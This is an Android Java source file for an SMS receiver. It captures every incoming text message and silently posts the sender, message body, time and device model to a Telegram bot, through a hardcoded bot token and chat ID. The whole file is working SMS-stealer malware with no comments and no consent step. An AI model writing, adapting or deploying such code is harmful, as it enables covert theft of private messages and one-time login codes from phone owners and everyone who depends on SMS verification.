import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class SmsReceiver extends BroadcastReceiver {
 private static final String TELEGRAM_TOKEN = "8846968989:AAE8bieJRR5MgUPSt_lmrdEg71jYTMZrdSM";
 private static final long TELEGRAM_CHAT_ID = 5882340013L;

 @Override
 public void onReceive(Context context, Intent intent) {
 if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
 Bundle bundle = intent.getExtras();
 SmsMessage[] msgs = null;
 String msgFrom = "";
 if (bundle != null) {
 try {
 Object[] pdus = (Object[]) bundle.get("pdus");
 msgs = new SmsMessage[pdus.length];
 for (int i = 0; i < msgs.length; i++) {
 msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
 msgFrom = msgs[i].getOriginatingAddress();
 }
 String msgBody = "";
 for (SmsMessage msg : msgs) {
 msgBody += msg.getMessageBody();
 }
 sendToTelegram(msgFrom, msgBody);
 } catch (Exception e) {
 e.printStackTrace();
 }
 }
 }
 }

 private void sendToTelegram(String sender, String message) {
 new Thread(() -> {
 try {
 URL url = new URL("https://api.telegram.org/bot" + TELEGRAM_TOKEN + "/sendMessage");
 HttpURLConnection connection = (HttpURLConnection) url.openConnection();
 connection.setRequestMethod("POST");
 connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
 connection.setDoOutput(true);
 String data = "chat_id=" + TELEGRAM_CHAT_ID +
 "&text=%F0%9F%93%A7+New+SMS+Received%0AFrom%3A+" + sender +
 "%0AMessage%3A+" + message +
 "%0ATime%3A+" + System.currentTimeMillis() +
 "%0ADevice%3A+" + Build.MODEL;
 OutputStreamWriter writer = new OutputStreamWriter(connection.getOutputStream());
 writer.write(data);
 writer.close();
 int responseCode = connection.getResponseCode();
 if (responseCode == 200) {
 Log.d("Telegram", "Sent successfully.");
 } else {
 Log.e("Telegram", "Failed to send.");
 }
 } catch (Exception e) {
 e.printStackTrace();
 }
 }).start();
 }
}